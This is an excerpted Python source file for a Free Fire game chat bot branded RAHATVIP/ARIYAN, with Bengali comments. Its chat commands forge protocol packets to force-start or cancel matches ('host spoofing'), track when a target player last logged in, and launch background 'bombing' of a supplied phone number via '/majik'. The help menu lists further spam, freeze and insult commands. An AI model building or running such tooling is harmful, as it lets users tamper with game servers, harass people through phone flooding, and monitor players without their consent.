                                await safe_send_message(response.Data.chat_type, success_msg, uid, chat_id, key, iv)

# ==================== FORCE START MATCH (HOST SPOOFING) ====================
                        if inPuTMsG.strip() == '/fstart':
                            print('Processing /fstart command')
                            
                            initial_message = f"[B][C][FF0000]🚀 ＦＯＲＣＥ  ＳＴＡＲＴ  ＩＮＩＴＩＡＴＥＤ 🚀\n[FFFFFF]সার্ভার হ্যাক করা হচ্ছে... ম্যাচ স্টার্ট হচ্ছে!"
                            await safe_send_message(response.Data.chat_type, initial_message, uid, chat_id, key, iv)
                            
                            async def force_start_match(k, v, reg, w_writer, o_writer):
                                try:
                                    # ১. প্রথমে নিজেকে লিডার দাবি করার জন্য ফেক রেডি প্যাকেট (Packet ID: 17)
                                    ready_fields = {
                                        1: 17,
                                        2: {
                                            1: 1  # 1 = Ready, 0 = Unready
                                        }
                                    }
                                    ready_pkt = await GeneRaTePk((await CrEaTe_ProTo(ready_fields)).hex(), '0515', k, v)
                                    if o_writer:
                                        o_writer.write(ready_pkt)
                                        await o_writer.drain()
                                        
                                    await asyncio.sleep(0.5) # আধা সেকেন্ড অপেক্ষা
                                    
                                    # ২. এরপর ম্যাচ স্টার্ট প্যাকেট পাঠানো (Packet ID: 22)
                                    start_fields = {
                                        1: 22,
                                        2: {
                                            1: 1,  # 1 = Start Match
                                            2: 1   # Match Mode (BR/CS)
                                        }
                                    }
                                    start_pkt = await GeneRaTePk((await CrEaTe_ProTo(start_fields)).hex(), '0515', k, v)
                                    if o_writer:
                                        o_writer.write(start_pkt)
                                        await o_writer.drain()
                                        
                                    success_msg = f"[B][C][00FF00]✅ SUCCESS! জোর করে ম্যাচ স্টার্ট করা হয়েছে! 😎"
                                    await safe_send_message(response.Data.chat_type, success_msg, uid, chat_id, k, v)
                                    
                                except Exception as e:
                                    err_msg = f"[B][C][FF0000]❌ ERROR! স্টার্ট করতে সমস্যা হয়েছে: {str(e)[:40]}"
                                    await safe_send_message(response.Data.chat_type, err_msg, uid, chat_id, k, v)

                            asyncio.create_task(force_start_match(key, iv, region, whisper_writer, online_writer))
# ==================== FORCE CANCEL MATCH ====================
                        if inPuTMsG.strip() == '/fcancel':
                            print('Processing /fcancel command')
                            
                            initial_message = f"[B][C][FFD700]🛑 ＦＯＲＣＥ  ＣＡＮＣＥＬ 🛑\n[FFFFFF]ম্যাচ মেকিং বন্ধ করা হচ্ছে..."
                            await safe_send_message(response.Data.chat_type, initial_message, uid, chat_id, key, iv)
                            
                            async def force_cancel_match(k, v, reg, w_writer, o_writer):
                                try:
                                    # ম্যাচ ক্যানসেল করার প্যাকেট (Packet ID: 22, Value: 0)
                                    cancel_fields = {
                                        1: 22,
                                        2: {
                                            1: 0,  # 0 = Cancel Matchmaking
                                            2: 1   
                                        }
                                    }
                                    cancel_pkt = await GeneRaTePk((await CrEaTe_ProTo(cancel_fields)).hex(), '0515', k, v)
                                    
                                    if o_writer:
                                        o_writer.write(cancel_pkt)
                                        await o_writer.drain()
                                        
                                        # নিজেকে আনরেডি করে নেওয়া (যাতে গেম আর স্টার্ট না হতে পারে)
                                        unready_fields = {1: 17, 2: {1: 0}}
                                        unready_pkt = await GeneRaTePk((await CrEaTe_ProTo(unready_fields)).hex(), '0515', k, v)
                                        o_writer.write(unready_pkt)
                                        await o_writer.drain()
                                        
                                    success_msg = f"[B][C][00FF00]✅ SUCCESS! ম্যাচ ক্যানসেল করা হয়েছে! 🚫"
                                    await safe_send_message(response.Data.chat_type, success_msg, uid, chat_id, k, v)
                                    
                                except Exception as e:
                                    err_msg = f"[B][C][FF0000]❌ ERROR! ক্যানসেল করতে সমস্যা হয়েছে: {str(e)[:40]}"
                                    await safe_send_message(response.Data.chat_type, err_msg, uid, chat_id, k, v)

                            asyncio.create_task(force_cancel_match(key, iv, region, whisper_writer, online_writer))
# ==================== REAL GHOST TRACKER SYSTEM ====================
                        if inPuTMsG.strip().startswith('/track '):
                            print('Processing real tracker command')
                            parts = inPuTMsG.strip().split()
                            
                            if len(parts) < 2:
                                error_msg = "[B][C][FF0000]❌ ব্যবহার: /track <uid>\n[FFFFFF]উদাহরণ: /track 123456789"
                                await safe_send_message(response.Data.chat_type, error_msg, uid, chat_id, key, iv)
                            else:
                                target_uid = parts[1]
                                
                                await safe_send_message(response.Data.chat_type, f"[B][C][00FFFF]📡 গ্যারিনা সার্ভার থেকে রিয়েল ডাটা খোঁজা হচ্ছে...\n[FFFFFF]টার্গেট: {target_uid}", uid, chat_id, key, iv)
                                
                                async def track_player_real(t_uid, c_type, s_uid, c_id, k, v):
                                    try:
                                        # API থেকে রিয়েল ইনফো নেওয়ার জন্য ThreadPoolExecutor ব্যবহার করা হলো
                                        loop = asyncio.get_event_loop()
                                        with ThreadPoolExecutor() as executor:
                                            info_data = await loop.run_in_executor(executor, get_player_info, t_uid)
                                        
                                        # যদি API কাজ না করে বা ভুল UID হয়
                                        if not info_data or isinstance(info_data, tuple):
                                            err_msg = "[B][C][FF0000]❌ ট্র্যাকিং ফেইলড: সঠিক প্লেয়ার পাওয়া যায়নি বা API অফলাইন!"
                                            await safe_send_message(c_type, err_msg, s_uid, c_id, k, v)
                                            return
                                            
                                        # ডাটা এক্সট্রাক্ট করা
                                        acc = info_data.get("AccountInfo", {})
                                        name = acc.get('AccountName', 'Unknown')
                                        last_login_ts = acc.get('AccountLastLogin', 0)
                                        
                                        # লাস্ট লগইন টাইম বের করা
                                        import time
                                        current_time = int(time.time())
                                        last_login_str = human_time(last_login_ts)
                                        
                                        # স্ট্যাটাস ক্যালকুলেশন (রিয়েল)
                                        time_diff = current_time - int(last_login_ts)
                                        
                                        if time_diff < 300: # ৫ মিনিটের কম হলে
                                            status = "🟢 ONLINE / PLAYING"
                                        elif time_diff < 3600: # ১ ঘন্টার কম হলে
                                            status = "🟡 RECENTLY ACTIVE (Lobby/Offline)"
                                        else:
                                            status = "⚫ OFFLINE"

                                        result_msg = f"""[B][C][00FF00]✅ ＲＥＡＬ  ＴＲＡＣＫ  ＣＯＭＰＬＥＴＥ ✅
[FFFFFF]──────────────────────
[B][C][00FFFF]👤 নাম: [FFFFFF]{name}
[B][C][FFD700]🎯 টার্গেট: [FFFFFF]{t_uid}
[B][C][00FF00]📡 বর্তমান অবস্থা: [FFFFFF]{status}
[B][C][FFA500]🕒 শেষ লগইন: [FFFFFF]{last_login_str}
[FFFFFF]──────────────────────"""
                                        await safe_send_message(c_type, result_msg, s_uid, c_id, k, v)
                                        
                                    except Exception as e:
                                        err_msg = f"[B][C][FF0000]❌ ট্র্যাকিং ফেইলড: {str(e)[:40]}"
                                        await safe_send_message(c_type, err_msg, s_uid, c_id, k, v)

                                asyncio.create_task(track_player_real(target_uid, response.Data.chat_type, uid, chat_id, key, iv))
# ==================== /majik COMMAND UPDATED ====================
                        if inPuTMsG.strip().startswith('/majik'):
                            parts = inPuTMsG.strip().split()
                            if len(parts) < 2:
                                error_msg = "[B][C][FF0000]❌ ব্যবহার: /majik <নম্বর>\n[FFFFFF]উদাহরণ: /majik 01712345678"
                                await safe_send_message(response.Data.chat_type, error_msg, uid, chat_id, key, iv)
                            else:
                                # নম্বর ক্লিন করা
                                raw_num = ''.join(filter(str.isdigit, parts[1]))
                                if len(raw_num) < 10:
                                    await safe_send_message(response.Data.chat_type, "[B][C][FF0000]❌ সঠিক ১০ বা ১১ ডিজিটের নম্বর দিন!", uid, chat_id, key, iv)
                                else:
                                    target_10 = raw_num[-10:] 
                                    
                                    # গেমে স্টার্ট মেসেজ
                                    start_msg = (
                                        f"[B][C][00FFFF]🔥 ＭＡＪＩＫ  ＴＵＲＢＯ  ＳＴＡＲＴＥＤ 🔥\n"
                                        f"[FFFFFF]Check Terminal for Speed!"
                                    )
                                    await safe_send_message(response.Data.chat_type, start_msg, uid, chat_id, key, iv)

                                    # ব্যাকগ্রাউন্ডে বোম্বিং শুরু (Indentation ঠিক রাখা হয়েছে)
                                    asyncio.create_task(run_fast_majik(target_10, response.Data.chat_type, uid, chat_id, key, iv))
...
[B][C]{result}
[FFFFFF]──────────────────────
[B][C][00FFFF]⚡ Powered by RAHATVIP
"""
...
[FF0000]╠══════════╣
[FFD700]⚡ OWNER : [FFFFFF]RAHAT   
[FFD700]✨ Name on tiktok : [FFFFFF] ARIYAN__222 ❤️  
[FF0000]╚══════════╝
[FFD700]✨ Developer —͟͞͞ </> RAHAT❄️  ⚡
"""
...
"""
                        ...
                        if inPuTMsG.strip().startswith('/vspam'):
                            parts = inPuTMsG.strip().split()
                            if len(parts) < 2:
...
[00FF00]Use: /bundle [name]"""
                        ...
                        # যদি ফাঁকা মেসেজ আসে, তবে ক্র্যাশ না করে ইগনোর করবে
                        if not parts:
                            continue
                            
                        cmd = parts[0].lower()

                        if cmd == "/f" or cmd == "/freeze":
...
# =================================================================
                        # EXACT MATCH FULL COMMANDS VIP HELP MENU 🚀 (UNIVERSAL FOR ALL CHAT TYPES)
                        # =================================================================
...
[B][00FFFF]├─[00FF00]/vspam [FFFFFF][uid]
[B][00FFFF]├─[00FF00]/room [FFFFFF][uid] [rmid]
[B][00FFFF]└─[00FF00]/spam2 [FFFFFF][all]
[B][00FFFF]──────────────────"""
...
[B][8A2BE2]└─[00FF7F]/Gali2 [FFFFFF][নাম] (ইউ আইডি)
[B][8A2BE2]──────────────────"""
...
[B][4169E1]└─[FFFFFF]TG: @ff_ariyan_bot
[B][4169E1]──────────────────
[B][FF0000]WARNING
...
[B][4169E1]──────────────────"""
                        ...
                        # =================================================================
                        # ARIYAN LOGO ANIMATION (5 COLORS, 0.2s DELAY)
                        # =================================================================
                        if inPuTMsG.strip().lower() == "ariyan":
                            print(f"Ariyan animation triggered by UID: {uid}")
                            
                            # ব্যাকগ্রাউন্ড টাস্ক যাতে বট ল্যাগ না করে
                            async def ariyan_logo_sequence(c_type, t_uid, c_id, k, v):
                                # ৫টি ভিন্ন ভিন্ন কালার (Cyan, Yellow, Pink, Green, Red)
                                colors = ["[00FFFF]", "[FFFF00]", "[FF00FF]", "[00FF00]", "[FF0000]"]
                                
                                # বেসিক লোগো স্ট্রাকচার (শুধু কালার প্লেসহোল্ডার {c} রাখা হয়েছে)
                                logo_template = """{c} WLC ARIYAN BOT
░█████╗░██████╗░██╗██╗░░░██╗░█████╗░███╗░░██╗
██╔══██╗██╔══██╗██║╚██╗░██╔╝██╔══██╗████╗░██║
███████║██████╔╝██║░╚████╔╝░███████║██╔██╗██║
██╔══██║██╔══██╗██║░░╚██╔╝░░██╔══██║██║╚████║
...
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝"""
                                ...
                                # ৫ বার লুপ চলবে (প্রতিবার ভিন্ন কালার)
                                for color in colors:
                                    colored_logo = logo_template.format(c=color)
                                    await safe_send_message(c_type, colored_logo, t_uid, c_id, k, v)
                                    await asyncio.sleep(0.7) # ০.২ সেকেন্ড ব্রেক
                                    
                            # টাস্কটি চালু করে দেওয়া হলো
                            asyncio.create_task(ariyan_logo_sequence(response.Data.chat_type, uid, chat_id, key, iv))
...
async def MaiiiinE():
    ...
    boot_texts = [
        "Initializing RAHATNeural Network...",
...
def handle_keyboard_interrupt(signum, frame):
    ...
    print("\033[38;5;46m👋 Thanks for using RAHATVIP Engine!\033[0m")
    sys.exit(0)
